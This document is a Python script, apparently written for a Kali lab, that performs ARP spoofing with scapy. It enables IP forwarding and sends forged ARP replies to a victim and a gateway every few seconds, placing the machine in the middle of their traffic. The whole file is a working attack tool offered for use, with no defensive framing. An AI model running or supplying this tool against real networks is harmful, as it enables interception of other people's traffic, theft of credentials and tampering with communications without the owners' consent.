#!/usr/bin/env python3
"""
ARP spoofer — hardcoded-MAC version.
Reads MACs from the ARP cache (no ARP requests sent from Python).
"""
import scapy.all as scapy
import subprocess
import time
import sys
import re

def get_mac_from_cache(ip):
    """Read MAC from the kernel ARP cache (populated by earlier pings)."""
    try:
        out = subprocess.check_output(["ip", "neigh", "show", ip], text=True)
        m = re.search(r"lladdr ([0-9a-f:]+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None

def get_iface_for_ip(ip):
    """Determine which interface holds the IP."""
    try:
        out = subprocess.check_output(["ip", "neigh", "show", ip], text=True)
        m = re.search(r"dev (\S+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "veth-kali"

def spoof(target_ip, host_ip, iface):
    target_mac = get_mac_from_cache(target_ip)
    if not target_mac:
        print(f"[!] No MAC for {target_ip} in ARP cache. Skipping this round.")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    scapy.send(packet, iface=iface, verbose=False)
    self_mac = scapy.get_if_hwaddr("eth0")
    print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")

def enable_ip_route():
    with open("/proc/sys/net/ipv4/ip_forward", "r+") as f:
        if f.read().strip() != "1":
            f.seek(0)
            f.write("1\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <gateway_ip>")
        sys.exit(1)
    target = sys.argv[1]
    host = sys.argv[2]

    iface_target = get_iface_for_ip(target)
    iface_host = get_iface_for_ip(host)

    print("[!] Enabling IP Routing...")
    enable_ip_route()
    print("[!] IP Routing enabled.")
    print(f"[i] Victim {target} via {iface_target}")
    print(f"[i] Gateway {host} via {iface_host}")

    try:
        count = 0
        while True:
            spoof(target, host, iface_target)
            spoof(host, target, iface_host)
            count += 2
            print(f"\r[*] Packets Sent {count}", end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[+] Arp Spoof Stopped")
